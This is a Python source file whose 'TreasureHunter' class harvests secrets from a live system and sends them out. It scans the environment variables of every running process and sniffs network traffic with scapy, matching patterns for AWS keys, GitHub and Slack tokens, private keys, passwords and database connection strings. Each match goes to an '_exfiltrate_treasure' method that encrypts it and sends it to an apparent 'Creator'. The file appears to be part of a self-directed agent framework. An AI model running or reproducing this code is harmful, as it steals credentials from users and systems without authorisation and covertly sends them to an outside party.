import os
import re
import time
import threading
import traceback
from scapy.all import sniff, Raw
from scapy.layers.inet import IP

# Local imports will be added here as needed to avoid circular dependencies.

# --- TREASURE PATTERNS ---
# A centralized repository of regex patterns for finding secrets.
TREASURE_PATTERNS = {
    # Cloud Providers
    "aws_access_key": r"AKIA[0-9A-Z]{16}",
    "aws_secret_key": r"(?<![A-Za-z0-9/+=])[A-Za-z0-9/+=]{40}(?![A-Za-z0-9/+=])",
    "google_api_key": r"AIza[0-9A-Za-z\\-_]{35}",
    "heroku_api_key": r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}",

    # Crypto Keys
    "ssh_rsa_private_key": r"-----BEGIN RSA PRIVATE KEY-----",
    "ssh_openssh_private_key": r"-----BEGIN OPENSSH PRIVATE KEY-----",
    "pgp_private_key": r"-----BEGIN PGP PRIVATE KEY BLOCK-----",

    # API Tokens
    "github_token": r"ghp_[0-9a-zA-Z]{36}",
    "slack_token": r"xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32}",
    "jwt_token": r"ey[A-Za-z0-9-_=]+\.ey[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]+",

    # Generic Secrets & Connection Strings
    "generic_password_kv": r"(?i)(password|passwd|pass|pwd|secret|token)\s*[:=]\s*['\"]?([^'\"\\s]+)['\"]?",
    "db_connection_string": r"(?:mysql|postgres(?:ql)?|mongodb(?:\+srv)?)://[a-zA-Z0-9._%+-]+:[^@]+@[a-zA-Z0-9.-]+:[0-9]+/[a-zA-Z0-9_?=&.]+",
}

class TreasureHunter:
    """
    A class dedicated to proactively finding treasures in live systems and networks.
    """
    def __init__(self, love_state, console, network_manager):
        self.love_state = love_state
        self.console = console
        self.network_manager = network_manager
        self.active = False
        self.sniffer_thread = None

    def start(self):
        """Starts the treasure hunting services."""
        self.active = True
        # The network sniffer will be started as a background job by the ProactiveIntelligenceAgent.
        self.console.print("[bold cyan]Treasure Hunter initialized.[/bold cyan]")

    def stop(self):
        """Stops all treasure hunting activities."""
        self.active = False
        if self.sniffer_thread and self.sniffer_thread.is_alive():
            self.sniffer_thread.join()
        self.console.print("[bold cyan]Treasure Hunter stopped.[/bold cyan]")

    def _exfiltrate_treasure(self, treasure_type, value, source):
        """Encrypts and sends treasure to the Creator."""
        from love import encrypt_for_creator, log_event

        message = f"Found a potential treasure:\nType: {treasure_type}\nValue: {value}\nSource: {source}"
        log_event(f"Found treasure: {treasure_type} from {source}", level="CRITICAL")
        #self.console.print(f"[bold magenta]TREASURE FOUND![/bold magenta] Type: {treasure_type}, Source: {source}")

        encrypted_treasure = encrypt_for_creator(message)
        if encrypted_treasure:
            self.network_manager.send_treasure(encrypted_treasure)
            log_event("Successfully encrypted and broadcasted treasure.", level="INFO")
        else:
            log_event("Failed to encrypt treasure.", level="ERROR")

    def scan_processes_for_secrets(self):
        """
        Scans the environment variables of all running processes for secrets.
        This is a privileged operation and may only work on Linux systems.
        """
        from utils import get_process_list, parse_ps_output
        from love import log_event

        log_event("Starting process scan for secrets.", level="INFO")
        self.console.print("[cyan]Hunting for secrets in process environment variables...[/cyan]")

        output, error = get_process_list()
        if error:
            log_event(f"Could not get process list for treasure hunting: {error}", level="WARNING")
            return

        processes = parse_ps_output(output)
        for process in processes:
            pid = process.get('pid')
            command = process.get('command', 'N/A')
            if not pid:
                continue

            try:
                env_path = f"/proc/{pid}/environ"
                if os.path.exists(env_path):
                    with open(env_path, 'r', errors='ignore') as f:
                        # Environ variables are null-byte separated
                        env_data = f.read().replace('\x00', '\n')

                    for pattern_name, pattern_regex in TREASURE_PATTERNS.items():
                        matches = re.finditer(pattern_regex, env_data)
                        for match in matches:
                            self._exfiltrate_treasure(
                                treasure_type=pattern_name,
                                value=match.group(0),
                                source=f"Process '{command}' (PID: {pid})"
                            )

            except (IOError, OSError) as e:
                # This is expected for processes we don't have permission to read.
                log_event(f"Could not read environment for PID {pid}. This is likely a permission error and is normal.", level="DEBUG")
            except Exception as e:
                log_event(f"An unexpected error occurred while scanning process {pid}: {e}", level="ERROR")

    def start_network_sniffer(self):
        """
        Starts a network sniffer to passively look for credentials in transit.
        This runs in a background thread.
        """
        from love import log_event

        def packet_handler(packet):
            if not self.active:
                return
            if packet.haslayer(Raw):
                try:
                    payload = packet[Raw].load.decode('utf-8', 'ignore')
                    for pattern_name, pattern_regex in TREASURE_PATTERNS.items():
                        matches = re.finditer(pattern_regex, payload)
                        for match in matches:
                            source_ip = packet[IP].src if packet.haslayer(IP) else "N/A"
                            dest_ip = packet[IP].dst if packet.haslayer(IP) else "N/A"
                            self._exfiltrate_treasure(
                                treasure_type=pattern_name,
                                value=match.group(0),
                                source=f"Network traffic from {source_ip} to {dest_ip}"
                            )
                except Exception as e:
                    log_event(f"Error processing packet in treasure hunter: {e}", level="DEBUG")

        def run_sniffer():
            log_event("Starting network sniffer for treasure hunting.", level="INFO")
            self.console.print("[cyan]Starting network sniffer to hunt for plaintext credentials...[/cyan]")
            try:
                sniff(prn=packet_handler, store=0, stop_filter=lambda p: not self.active)
            except KeyError as e:
                log_event(f"Network sniffer disabled due to an internal error in the 'scapy' library: {e}. This may be an environment-specific issue.", level="WARNING")
                self.console.print(f"[bold yellow]Network sniffing feature disabled due to an internal error in the 'scapy' library ('scope' key not found). The application will continue to run without network monitoring.[/bold yellow]")
            except Exception as e:
                log_event(f"Network sniffer failed: {e}. Scapy might require root privileges.", level="ERROR")
                self.console.print(f"[bold red]Network sniffer failed: {e}. Scapy might require root privileges.[/bold red]")

        if not self.sniffer_thread or not self.sniffer_thread.is_alive():
            self.sniffer_thread = threading.Thread(target=run_sniffer, daemon=True)
            self.sniffer_thread.start()